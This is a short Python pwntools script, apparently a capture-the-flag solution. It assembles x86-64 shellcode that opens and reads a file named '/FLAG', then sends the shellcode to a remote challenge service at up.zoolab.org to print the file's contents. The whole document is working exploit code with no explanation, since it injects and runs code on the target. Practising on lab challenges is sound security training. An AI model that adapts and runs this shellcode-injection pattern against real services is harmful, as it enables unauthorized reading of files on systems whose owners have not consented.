from pwn import *

context.arch = 'amd64'
shellcode_asm = """
    call get_flag_string_ptr
flag_string:
    .string "/FLAG"  
get_flag_string_ptr:
    pop rdi

    mov eax, 2
    xor esi, esi
    xor edx, edx
    syscall

    mov rbx, rax

    sub rsp, 0x50
    mov rsi, rsp

    xor eax, eax
    mov rdi, rbx
    mov edx, 0x4f
    syscall

    mov rdx, rax
    mov eax, 1
    mov edi, 1
    syscall

    mov eax, 60
    xor edi, edi
    syscall
"""

sc = asm(shellcode_asm)
target_host = "up.zoolab.org"
target_port = 12341

io = remote(target_host, target_port)

prompt = io.recvuntil(b"Enter your code> ")
print(prompt.decode(), end='')

io.send(sc)

try:
    flag_output = io.recvall(timeout=2)
    print(f"\n{flag_output.decode().strip()}")
except EOFError:
    print("\nError")

io.close()